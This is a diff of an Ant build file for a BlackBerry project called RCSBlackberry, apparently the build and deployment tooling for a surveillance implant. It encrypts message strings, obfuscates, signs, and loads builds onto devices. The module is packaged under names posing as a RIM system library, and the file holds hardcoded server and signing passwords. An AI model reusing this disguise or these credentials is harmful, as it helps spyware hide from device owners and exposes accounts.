@@ -1,10 +1,16 @@
 <project name="RCSBlackberry" default="help" basedir=".">
 	<typedef resource="bb-ant-defs.xml" />
 	<!-- <taskdef resource="net/sf/antcontrib/antcontrib.properties" /> -->
-	<taskdef resource="net/sf/antcontrib/antlib.xml" />
+
+	<taskdef resource="net/sf/antcontrib/antlib.xml">
+		<classpath>
+			<pathelement location="bb-tools/ant-contrib-1.0b3.jar" />
+		</classpath>
+	</taskdef>
 
 	<!-- Environment properties -->
 	<property file="local.properties" />
+	<property file="version" />
 
 	<path id="lib.classpath">
 		<path location="${net_rim_api.jar}" />
@@ -24,6 +30,10 @@
 	<property name="lib.codename" value="net_rim_bb_lib_base" />
 	<property name="group.name" value="Rim Library" />
 
+	<property name="dist.lib" value="output/45/release/${lib.codename}.cod" />
+	<property name="dist.core" value="output/45/release/${core.codename}.cod" />
+	<property name="nodemo.core" value="output/45/nodemo/${core.codename}.cod" />
+	<property name="debug.core" value="output/45/debug/${core.codename}.cod" />
 
 	<!-- Symbols 
 	DEBUG: versione con i log di debug su file
@@ -33,10 +43,12 @@
 	DEMO: versione demo, a meno di binary patch
 	NODEMO: inibisce la demo.	
 	-->
-	<property name="preprocess.debug.symbols" value="DEBUG,NODEMO,DBC" />
+	<property name="preprocess.debug.symbols" value="DEBUG,DBC" />
 	<property name="preprocess.test.symbols" value="TEST" />
-	<property name="preprocess.release.symbols" value="RELEASE,NODEMO" />
-	<property name="preprocess.demo.symbols" value="RELEASE,DEMO" />
+	<property name="preprocess.release.symbols" value="RELEASE" />
+	<property name="preprocess.nodemo.symbols" value="RELEASE,NODEMO" />
+	<property name="preprocess.fakeconf.symbols" value="DEBUG,DBC,DEMO,FAKECONF" />
+
 
 	<!-- Sources -->
 	<property name="lib.src" location="RCSBlackBerryResources/src" />
@@ -50,6 +62,34 @@
 	<taskdef name="wtkrapc" classname="de.pleumann.antenna.WtkRapc" classpath="${antenna.jar}" />
 	<taskdef name="wtkobfuscate" classname="de.pleumann.antenna.WtkObfuscate" classpath="${antenna.jar}" />
 	<taskdef name="wtkjad" classname="de.pleumann.antenna.WtkJad" classpath="${antenna.jar}" />
+
+	<taskdef name="crypter" classname="com.example.ant.Crypter">
+		<classpath>
+			<pathelement path="crypter/build/archive/crypter-ant.jar" />
+		</classpath>
+	</taskdef>
+
+	<taskdef name="random" classname="com.example.ant.RandomString">
+		<classpath>
+			<pathelement path="crypter/build/archive/crypter-ant.jar" />
+			<fileset dir="crypter/lib">
+				<include name="**/*.jar" />
+				<include name="**/*.zip" />
+			</fileset>
+		</classpath>
+	</taskdef>
+
+	<target name="salt">
+		<random len="8" property="randomSalt">
+		</random>
+		<echo>Random:${randomSalt}</echo>
+	</target>
+
+	<target name="encrypt-messages" depends="salt">
+		<delete file="RCSBlackberry/src/messages.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5333494a32158f52" inputFile="RCSBlackberry/preprocess/messages.properties.all" outputFile="RCSBlackberry/src/messages.bin" />
+	</target>
+
 
 	<target name="Display-Builtins" description="Display Builtin Properties">
 		<!-- the absolute path to the location of the buildfile -->
@@ -65,6 +105,23 @@
 	</target>
 
 
+	<macrodef name="fakeconf">
+		<attribute name="preprocess.symbols" />
+		<attribute name="dir.to" />
+		<sequential>
+			<if>
+				<contains string="@{preprocess.symbols}" substring="FAKECONF" />
+				<then>
+					<echo message="copy config.json to: @{dir.to}/config.json" />
+					<copy file="RCSBlackberry/preprocess/config.json" tofile="@{dir.to}/config.json" />
+				</then>
+				<else>
+					<echo message="do not copy config.json" />
+				</else>
+			</if>
+		</sequential>
+	</macrodef>
+
 	<macrodef name="preprocess">
 		<attribute name="dir.src" />
 		<attribute name="dir.to" />
@@ -75,14 +132,19 @@
 			<mkdir dir="@{dir.to}" />
 			<copy todir="@{dir.to}">
 				<fileset dir="@{dir.src}">
+					<include name="**/*.java" />
+					<include name="**/messages.bin" />
+					<include name="**/config.bin" />
 					<exclude name="@{exclude}" />
 				</fileset>
 			</copy>
+
+			<fakeconf dir.to="@{dir.to}" preprocess.symbols="@{preprocess.symbols}" />
+
 			<replace dir="@{dir.to}" token="//#preprocess" value="//!preprocess" />
 			<wtkpreprocess verbose="false" srcdir="@{dir.to}" destdir="@{dir.to}" symbols="@{preprocess.symbols}" />
 		</sequential>
 	</macrodef>
-
 
 	<macrodef name="libbuild">
 		<attribute name="preprocess.symbols" />
@@ -230,6 +292,8 @@
 			<wtkpackage jarfile="${builddir}/core.jar" jadfile="${builddir}/core.jad">
 				<fileset dir="${builddir}/unverified" />
 				<fileset dir="${core.src}/../res" includes="**/*.png" />
+				<fileset dir="${builddir}/preprocessed" includes="messages.bin" />
+				<fileset dir="${builddir}/preprocessed" includes="config.json" />
 			</wtkpackage>
 
 			<!-- Obfuscate -dontshrink -->
@@ -288,7 +352,6 @@
 		<attribute name="dir" />
 		<sequential>
 			<echo message="=== Sign @{dir}/@{cod} ===" />
-
 			<!--<sigtool jdehome="${jde.home}" codfile="output/tocod/${codename}.cod" /> -->
 			<java jar="${blackberry.certificate.dir}/SignatureTool.jar" fork="true" dir="@{dir}" failonerror="true">
 				<arg line=" -a -p KUZ93HQ1 -c -s @{cod}" />
@@ -296,22 +359,23 @@
 		</sequential>
 	</macrodef>
 
-
-
-	<target name="init" depends="clean">
+	<target name="init" depends="encrypt-messages">
 		<echo message="=== Init ===" />
+		<echo message="=== Version ${version} ===" />
 		<tstamp>
 			<format property="timestamp.BUILD" pattern="yyyyMMdd-hhmmss" />
 		</tstamp>
 		<buildnumber />
+
 		<copy file="RCSBlackberry/preprocess/Cfg.java" toFile="RCSBlackberry/src/blackberry/config/Cfg.java" overwrite="true">
 			<filterset>
 				<filter token="BUILD_ID" value="${build.number}" />
 				<filter token="BUILD_TIMESTAMP" value="${timestamp.BUILD}" />
-
 				<filter token="GROUP_NAME" value="${group.name}" />
 				<filter token="MODULE_NAME" value="${core.codename}" />
 				<filter token="MODULE_LIB_NAME" value="${lib.codename}" />
+				<filter token="RANDOM" value="${randomSalt}" />
+				<filter token="VERSION" value="${version}" />
 			</filterset>
 		</copy>
 		<mkdir dir="build" />
@@ -324,11 +388,13 @@
 		<echo message="=== Clean ===" />
 		<delete dir="build" includeEmptyDirs="true" />
 		<delete dir="output" includeEmptyDirs="true" />
+		<delete dir="server/core" includeEmptyDirs="true" />
+		<delete file="${core.src}/config.json" failonerror="false" />
 	</target>
 
-
 	<!-- list="45,50" -->
-	<target name="build" depends="init">
+	<target name="build" depends="clean,init">
+
 		<for list="45" param="version">
 			<sequential>
 				<echo message="==============" />
@@ -349,39 +415,43 @@
 				<echo message="     DEBUG   " />
 				<corebuild kind="debug" version="@{version}" preprocess.symbols="${preprocess.debug.symbols}" />
 
+
 				<echo message="_____________" />
 				<echo message="    RELEASE  " />
 				<corebuild kind="release" version="@{version}" preprocess.symbols="${preprocess.release.symbols}" />
 
 				<echo message="_____________" />
-				<echo message="     DEMO    " />
-				<corebuild kind="demo" version="@{version}" preprocess.symbols="${preprocess.demo.symbols}" />
+				<echo message="    NODEMO  " />
+				<corebuild kind="nodemo" version="@{version}" preprocess.symbols="${preprocess.nodemo.symbols}" />
+
 				<!--
 				<echo message="_____________" />
-				<echo message="     TEST    " />
-				<corebuild kind="test" version="@{version}" preprocess.symbols="${preprocess.test.symbols}" />
+				<echo message="   FAKECONF    " />
+				<corebuild kind="fakeconf" version="@{version}" preprocess.symbols="${preprocess.fakeconf.symbols}" />
 				
-								
+				<echo message="_____________" />
+				<echo message="     TEST    " />
+				<corebuild kind="test" version="@{version}" preprocess.symbols="${preprocess.test.symbols}" />			
 				-->
 			</sequential>
 		</for>
 	</target>
 
 	<!-- Load to device depends="sign" -->
-	<target name="upload">
+	<target name="load">
 		<echo message="=== Load ===" />
 		<echo>${jde.45.home}/bin/JavaLoader.exe ${lib.codename}.cod ${core.codename}.cod</echo>
 		<exec executable="${jde.45.home}/bin/JavaLoader.exe" dir="." failonerror="true">
 			<arg value="-wrddr" />
 			<arg value="-u" />
 			<arg value="load" />
-			<arg value="output/45/debug//${lib.codename}.cod" />
+			<arg value="output/45/debug/${lib.codename}.cod" />
 			<arg value="output/45/debug/${core.codename}.cod" />
 		</exec>
 	</target>
 
 	<!-- Load to device depends="sign" -->
-	<target name="updatecoredebug">
+	<target name="loadcoredebug">
 		<echo message="=== Load ===" />
 		<echo>${jde.45.home}/bin/JavaLoader.exe ${core.codename}.cod</echo>
 		<exec executable="${jde.45.home}/bin/JavaLoader.exe" dir="." failonerror="true">
@@ -392,10 +462,160 @@
 		</exec>
 	</target>
 
-	<target name="update" depends="updatecoredebug" />
+	<target name="loadcorerelease">
+		<echo message="=== Load ===" />
+		<echo>${jde.45.home}/bin/JavaLoader.exe ${core.codename}.cod</echo>
+		<exec executable="${jde.45.home}/bin/JavaLoader.exe" dir="." failonerror="true">
+			<arg value="-wrddr" />
+			<arg value="-u" />
+			<arg value="load" />
+			<arg value="output/45/release/${core.codename}.cod" />
+		</exec>
+	</target>
+
+	<target name="loadcore" depends="loadcorerelease" />
+
+	<!-- Load to device depends="sign" -->
+	<target name="uninstall">
+		<echo message="=== Uninstall ===" />
+		<echo>${jde.45.home}/bin/JavaLoader.exe</echo>
+		<exec executable="${jde.45.home}/bin/JavaLoader.exe" dir="." failonerror="true">
+			<arg value="-u" />
+			<arg value="erase" />
+			<arg value="-f" />
+			<arg value="${core.codename}.cod" />
+		</exec>
+	</target>
+
+	<!-- C:\Ruby193\bin\ruby c:\HT\rcs-core-build\rcs-core.rb -u zeno -p zenop123 -d rcs-castore -n blackberry -f RCS_0000000746 $args -->
+	<macrodef name="updaterelease">
+		<attribute name="server" />
+		<attribute name="login" />
+		<attribute name="password" />
+		<attribute name="file" />
+		<sequential>
+			<echo>@{server}</echo>
+
+			<exec executable="${ruby.path}/ruby.exe" dir="." failonerror="true">
+				<arg value="${rcscore.path}/rcs-core.rb" />
+				<arg value="-u" />
+				<arg value="@{login}" />
+				<arg value="-p" />
+				<arg value="@{password}" />
+				<arg value="-d" />
+				<arg value="@{server}" />
+				<arg value="-n" />
+				<arg value="blackberry" />
+				<arg value="-R" />
+				<arg value="@{file}" />
+			</exec>
+
+		</sequential>
+	</macrodef>
+
+	<target name="update">
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file=".\server\blackberry_${version}.zip" />
+		<copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\blackberry.zip" overwrite="true" />
+	</target>
+
+	<target name="addconf">
+		<fakeconf dir.to="${core.src}" preprocess.symbols="FAKECONF" />
+	</target>
 
 	<property name="blackberry.simulator.path" location="${jde.45.home}\simulator" />
 	<property name="simulator.model" value="8300" />
+
+	<target name="servercore">
+		<mkdir dir="server/core" />
+		<mkdir dir="server/core/bin" />
+		<copy toDir="server/core" overwrite="true">
+			<fileset dir="server/template" excludes="**/bin" />
+			<filterset>
+				<filter token="VERSION" value="${version}" />
+			</filterset>
+		</copy>
+		<copy toDir="server/core/bin" overwrite="true">
+			<fileset dir="server/template/bin" />
+		</copy>
+
+		<copy file="${dist.lib}" toDir="server/core" overwrite="true" />
+		<copy file="${dist.core}" toDir="server/core" overwrite="true" />
+
+		<zip destfile="server/blackberry_${version}.zip" basedir="server/core" />
+	</target>
+
+
+	<macrodef name="zipdist">
+		<attribute name="destfile" />
+		<sequential>
+			<zip destfile="@{destfile}">
+				<zipfileset dir="RCSBlackberry" prefix="RCSBlackberry" />
+				<zipfileset dir="RCSBlackberryResources" prefix="RCSBlackberryResources" />
+				<zipfileset dir="." includes="server" />
+				<fileset dir="." includes="local.properties" />
+				<fileset dir="." includes="build.xml" />
+			</zip>
+		</sequential>
+	</macrodef>
+
+	<macrodef name="rcscomp">
+		<attribute name="destdir" />
+		<sequential>
+			<mkdir dir="@{destdir}/rcs7" />
+
+			<copy file="${dist.lib}" tofile="@{destdir}/lib.blackberry" overwrite="true" />
+
+			<mkdir dir="@{destdir}/build" />
+			<unzip src="${dist.core}" dest="@{destdir}/build" overwrite="true" />
+			<move file="@{destdir}/build/net_rim_bb_lib.cod" tofile="@{destdir}/build/net_rim_bb_core-0.cod" overwrite="true" />
+			<move file="@{destdir}/build/net_rim_bb_lib-1.cod" tofile="@{destdir}/build/net_rim_bb_core-1.cod" overwrite="true" />
+			<zip destfile="@{destdir}/core.demo.blackberry" basedir="@{destdir}/build/" compress="false" />
+
+			<mkdir dir="@{destdir}/buildnodemo" />
+			<unzip src="${nodemo.core}" dest="@{destdir}/buildnodemo" overwrite="true" />			
+			<move file="@{destdir}/buildnodemo/net_rim_bb_lib.cod" tofile="@{destdir}/buildnodemo/net_rim_bb_core-0.cod" overwrite="true" />
+			<move file="@{destdir}/buildnodemo/net_rim_bb_lib-1.cod" tofile="@{destdir}/buildnodemo/net_rim_bb_core-1.cod" overwrite="true" />
+			<zip destfile="@{destdir}/core.nodemo.blackberry" basedir="@{destdir}/buildnodemo/" compress="false" />
+		</sequential>
+	</macrodef>
+
+	<target name="zip">
+		<zipdist destfile="../Dist/test.zip" />
+	</target>
+
+	<target name="dist">
+
+		<tstamp>
+			<format property="timestamp.BUILD" pattern="yyyyMMdd-hhmmss" />
+		</tstamp>
+		<property file="build.number" />
+
+		<input message="Release (8.0)?" addproperty="do.release" defaultvalue="8.0" />
+		<var name="destdir" value="../dist/${do.release}/${build.number}.${timestamp.BUILD}" />
+		<echo>${destdir}</echo>
+		<mkdir dir="${destdir}" />
+
+		<rcscomp destdir="${destdir}/rcs7" />
+
+		<copy file="${dist.lib}" toDir="${destdir}" overwrite="true" />
+		<copy file="${dist.core}" toDir="${destdir}" overwrite="true" />
+		<copy file="${debug.core}" toFile="${destdir}/core.debug.cod" overwrite="true" />
+
+		<antcall target="servercore" />
+		<copy file="server/blackberry_${version}.zip" toDir="${destdir}" overwrite="true" />
+
+		<zipdist destfile="${destdir}/blackberry_sources.zip" />
+
+		<checksum>
+			<fileset dir="${destdir}/">
+				<include name="*" />
+			</fileset>
+		</checksum>
+
+		<antcall target="update" />
+
+	</target>
+
 
 	<!-- To run the application in simulator
 	PS C:\Users\fabrizio\blackberry\Workspace> C:\Developer\eclipse_bb\plugins\net.rim.ejde.componentpack4.5.0_4.5.0.28\components\simulator\
@@ -414,7 +634,6 @@
     http://docs.blackberry.com/en/developers/deliverables/606/BlackBerry_Device_Simulator_User_Guide.pdf
 	-->
 	<target name="simulator" description="Run in ${simulator.model} Simulator">
-
 		<exec dir="${blackberry.simulator.path}" executable="${blackberry.simulator.path}/fledge.exe" spawn="true">
 			<arg line=" /app=Jvm.dll " />
 			<arg line=" /handheld=${simulator.model} " />
@@ -425,13 +644,16 @@
 			<arg line=" /data-port=0x4d4e " />
 			<arg line=" /pin=0x2100000A " />
 		</exec>
-
 	</target>
 
 	<target name="help">
 		<echo>ant build :  full build and sig</echo>
 		<echo>ant simulator :  starts the simulator</echo>
-		<echo>ant upload : uploads both the core and the lib</echo>
-		<echo>ant updatecoredebug : uploads the core debug 45</echo>
+		<echo>ant update : uploads both the core and the lib to castore</echo>
+		<echo>ant loadcoredebug : uploads the core debug 45 on device</echo>
+		<echo>ant loadcorerelease : uploads the core release 45 on device</echo>
+		<echo>ant init : updates messages.all, cfg.java</echo>
+		<echo>ant addconf : copy config.json in src/config.json</echo>
+		<echo>ant dist : create a dist zip file and updates server/core</echo>
 	</target>
 </project>
